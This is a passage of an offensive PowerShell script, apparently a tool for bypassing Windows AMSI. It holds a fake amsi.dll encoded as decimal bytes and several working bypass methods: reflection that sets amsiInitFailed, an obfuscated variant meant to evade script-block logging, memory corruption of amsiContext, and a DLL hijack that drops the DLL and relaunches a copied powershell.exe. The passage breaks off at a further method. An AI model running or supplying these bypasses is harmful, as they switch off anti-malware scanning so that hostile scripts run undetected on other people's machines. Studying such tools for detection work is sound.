136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0"

    if (([IntPtr]::Size) -eq 8)
    {
        Write-Verbose "64 bit process detected."
        $DllBytes = $AmsiX64
    }
    elseif (([IntPtr]::Size) -eq 4)
    {
        Write-Verbose "32 bit process detected."
        $DllBytes = $AmsiX86
    }
    
    switch($method)
    {
    
        "unload"
        {
            Write-Verbose "Using Matt Graeber's Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            }
        }

        "unloadsilent"
        {
            Write-Verbose "Using Matt Graeber's Reflection method with WMF5 autologging bypass."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
            }
        }

        "unloadobfuscated"
        {
            Write-Verbose "Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging."
            if ($ShowOnly -eq $True)
            {
                $code = @" 
Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])
"@
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output $code
            }
            else
            {
                Write-Output "Executing the bypass."
                Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI"  );  Invoke-Expression( -Join ( VaRIAbLe  ('R9'+'hyT')  -val  )[ - 1..- (( VaRIAbLe  ('R9'+'hyT')  -val  ).Length)])

            }
        }

        "unload2"
        {
            Write-Verbose "Using Matt Graeber's second Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
            }
        }

        "dllhijack"
        {
            Write-Verbose "Using Cornelis de Plaa's DLL hijack method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Copy powershell.exe from C:\Windows\System32\WindowsPowershell\v1.0 to a local folder and dropa fake amsi.dll in the same directory."
                Write-Output "Run the new powershell.exe and AMSI should be gone for that session."
            }
            else
            {
                [Byte[]] $temp = $DllBytes -split ' '                
                Write-Output "Executing the bypass."
                Write-Verbose "Dropping the fake amsi.dll to disk."
                [System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

                Write-Verbose "Copying powershell.exe to the current working directory."
                Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

                Write-Verbose "Starting powershell.exe from the current working directory."
                & "$pwd\powershell.exe"

            }
        }

        "psv2"
        {
